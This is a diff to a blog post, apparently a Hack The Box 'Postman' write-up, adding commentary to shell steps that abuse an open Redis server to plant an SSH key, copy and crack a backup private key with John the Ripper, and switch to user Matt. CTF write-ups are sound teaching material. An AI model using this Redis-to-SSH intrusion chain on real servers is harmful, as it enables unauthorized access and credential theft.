@@ -117,15 +117,16 @@ OK
 10.10.10.160:6379> 
 {% endhighlight %}
 
+Next, try to upload a public key for SSH.<br>
 {% highlight shell %}
 root@kali:~# (echo -e "\n\n"; cat .ssh/id_rsa.pub; echo -e "\n\n") > pubkey.txt
 {% endhighlight %}
-
 {% highlight shell %}
 root@kali:~# cat pubkey.txt | redis-cli -h 10.10.10.160 -x set pubkey
 OK
 {% endhighlight %}
 
+After that, save the key into the "/var/lib/redis/.ssh/authorized_keys".
 {% highlight shell %}
 root@kali:~# redis-cli -h 10.10.10.160
 10.10.10.160:6379> config set dir /var/lib/redis/.ssh
@@ -137,7 +138,8 @@ OK
 10.10.10.160:6379> 
 {% endhighlight %}
 
-
+Now we can SSH into the server as an user redis.<br>
+However, we don't have the "user.txt" in the home directory of redis user.
 {% highlight shell %}
 root@kali:~# ssh redis@10.10.10.160
 The authenticity of host '10.10.10.160 (10.10.10.160)' can't be established.
@@ -160,6 +162,7 @@ uid=107(redis) gid=114(redis) groups=114(redis)
 redis@Postman:~$ 
 {% endhighlight %}
 
+With some enumeration, we can find an interesting file "id_rsa.bak" in the "/opt" directory.
 {% highlight shell %}
 redis@Postman:~$ ls /opt/
 id_rsa.bak
@@ -197,12 +200,16 @@ X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
 redis@Postman:~$ 
 {% endhighlight %}
 
+Try to download with scp.
 {% highlight shell %}
 root@kali:~# scp redis@10.10.10.160:/opt/id_rsa.bak /root
 id_rsa.bak                                                        100% 1743    38.3KB/s   00:00    
 root@kali:~# 
 {% endhighlight %}
 
+Kali Linux can brute-force the password with the John the Ripper.<br>
+However, we need to change the SSH private key into the hash which format is readable by John the Ripper.<br>
+By cracking with "rockyou.txt", we can achieve a password "computer2008" for someone.
 {% highlight shell %}
 root@kali:~# /usr/share/john/ssh2john.py id_rsa.bak > hash.txt
 
@@ -221,6 +228,8 @@ Warning: Only 2 candidates left, minimum 8 needed for performance.
 Session completed
 *{% endhighlight %}
 
+Actually, we have only one user "Matt" who is allowed to log in except redis.<br>
+This time, we can't SSH but we can run su command to be the user "Matt".
 {% highlight shell %}
 redis@Postman:~$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -256,18 +265,13 @@ Password:
 Matt@Postman:/var/lib/redis$ 
 {% endhighlight %}
 
+The user.txt is in the home directory of user "Matt".
 {% highlight shell %}
 Matt@Postman:~$ pwd
 /home/Matt
 
 Matt@Postman:~$ cat user.txt 
 517ad0ec2458ca97af8d93aac08a2f3c
-
-Matt@Postman:~$ pwd
-/home/Matt
-Matt@Postman:~$ cat user.txt 
-517ad0ec2458ca97af8d93aac08a2f3c
-Matt@Postman:~$Matt@Postman:~$
 {% endhighlight %}_
 
 
